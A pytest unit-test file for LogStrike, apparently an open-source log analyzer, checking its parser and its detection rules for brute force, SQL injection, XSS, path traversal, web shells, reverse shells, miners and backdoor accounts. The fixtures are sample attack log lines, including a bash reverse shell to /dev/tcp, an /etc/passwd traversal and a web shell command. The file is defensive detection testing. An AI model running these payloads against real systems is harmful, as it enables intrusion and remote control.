"""
LogStrike — Unit Tests

Author  : Ernest Kosmatko (@Ernest-Kosmatko)
GitHub  : https://github.com/Ernest-Kosmatko/LogStrike
License : MIT © 2024 Ernest Kosmatko

Run with: pytest -v
"""

import pytest
from logstrike.analyzer import LogStrikeAnalyzer
from logstrike.parser import parse_line, LogSource
from logstrike.rules import Severity


# ── Parser tests ─────────────────────────────────────────────────────────────

class TestParser:
    def test_syslog_auth_line(self):
        line = "May 12 10:22:11 server1 sshd[1234]: Failed password for root from 192.168.1.50 port 52311 ssh2"
        entry = parse_line(line)
        assert entry.source == LogSource.AUTH
        assert entry.ip == "192.168.1.50"
        assert entry.timestamp is not None

    def test_apache_combined(self):
        line = '192.168.1.99 - - [12/May/2024:10:22:11 +0000] "GET /admin?id=1 UNION SELECT NULL-- HTTP/1.1" 200 1234 "-" "sqlmap/1.0"'
        entry = parse_line(line)
        assert entry.source == LogSource.APACHE
        assert entry.ip == "192.168.1.99"
        assert entry.extra.get("status") == "200"

    def test_unknown_line(self):
        entry = parse_line("some random log line")
        assert entry.source == LogSource.UNKNOWN
        assert entry.message == "some random log line"

    def test_empty_line(self):
        entry = parse_line("")
        assert entry.message == ""


# ── Analyzer tests ───────────────────────────────────────────────────────────

class TestLogStrikeAnalyzer:
    def setup_method(self):
        self.analyzer = LogStrikeAnalyzer(brute_force_threshold=3)

    def test_ssh_brute_force_detected(self):
        line = "May 12 10:00:01 host sshd[99]: Failed password for invalid user admin from 1.2.3.4 port 22 ssh2"
        findings = self.analyzer.analyze_line(line)
        assert any(f.rule.id == "LS-001" for f in findings)
        assert all(f.severity in Severity for f in findings)

    def test_ssh_root_login_detected(self):
        line = "May 12 10:00:01 host sshd[1]: Failed password for root from 5.5.5.5 port 22 ssh2"
        findings = self.analyzer.analyze_line(line)
        assert any(f.rule.id == "LS-002" for f in findings)

    def test_sql_injection_detected(self):
        line = "1.2.3.4 - - [12/May/2024:10:00:01 +0000] \"GET /search?q=1+UNION+SELECT+NULL--+HTTP/1.1\" 200 100"
        findings = self.analyzer.analyze_line(line)
        assert any(f.rule.id == "LS-003" for f in findings)

    def test_xss_detected(self):
        line = '1.2.3.4 - - [12/May/2024:10:00:01 +0000] "GET /page?q=<script>alert(1)</script> HTTP/1.1" 200 100'
        findings = self.analyzer.analyze_line(line)
        assert any(f.rule.id == "LS-004" for f in findings)

    def test_path_traversal_detected(self):
        line = '1.2.3.4 - - [12/May/2024:10:00:01 +0000] "GET /../../etc/passwd HTTP/1.1" 200 100'
        findings = self.analyzer.analyze_line(line)
        assert any(f.rule.id == "LS-005" for f in findings)

    def test_webshell_detected(self):
        line = '1.2.3.4 - - [12/May/2024:10:00:01 +0000] "POST /uploads/shell.php?cmd=id HTTP/1.1" 200 20'
        findings = self.analyzer.analyze_line(line)
        assert any(f.rule.id == "LS-006" for f in findings)

    def test_sudo_escalation_detected(self):
        line = "May 12 12:00:00 host sudo[100]: baduser : user NOT in sudoers ; TTY=pts/0"
        findings = self.analyzer.analyze_line(line)
        assert any(f.rule.id == "LS-008" for f in findings)

    def test_reverse_shell_detected(self):
        line = "May 12 11:00:00 host bash[555]: bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"
        findings = self.analyzer.analyze_line(line)
        assert any(f.rule.id == "LS-012" for f in findings)
        assert any(f.severity == Severity.CRITICAL for f in findings)

    def test_crypto_miner_detected(self):
        line = "May 12 12:00:00 host xmrig[200]: stratum+tcp://pool.minexmr.com:4444"
        findings = self.analyzer.analyze_line(line)
        assert any(f.rule.id == "LS-013" for f in findings)

    def test_new_account_detected(self):
        line = "May 12 09:10:00 host useradd[1400]: new user: name=backdoor, UID=1337"
        findings = self.analyzer.analyze_line(line)
        assert any(f.rule.id == "LS-014" for f in findings)

    def test_no_false_positive_on_clean(self):
        line = "May 12 10:00:01 host sshd[1]: Accepted publickey for alice from 10.0.0.2 port 54321 ssh2"
        findings = self.analyzer.analyze_line(line)
        assert findings == []

    def test_summary_structure(self):
        self.analyzer.analyze_line(
            "May 12 10:00:01 host sshd[1]: Failed password for root from 5.5.5.5 port 22 ssh2"
        )
        summary = self.analyzer.summary()
        assert "total_findings" in summary
        assert "findings_by_severity" in summary
        assert "top_offending_ips" in summary
        assert "brute_force_sources" in summary

    def test_brute_force_tracker(self):
        line = "May 12 10:00:01 host sshd[1]: Failed password for invalid user test from 9.9.9.9 port 22 ssh2"
        for _ in range(3):
            self.analyzer.analyze_line(line)
        bf = self.analyzer.brute_tracker.summary()
        assert "9.9.9.9" in bf
        assert bf["9.9.9.9"]["failures"] >= 3

    def test_reset_clears_state(self):
        self.analyzer.analyze_line(
            "May 12 10:00:01 host sshd[1]: Failed password for root from 1.1.1.1 port 22 ssh2"
        )
        self.analyzer.reset()
        assert self.analyzer.findings == []
        assert self.analyzer.summary()["total_findings"] == 0
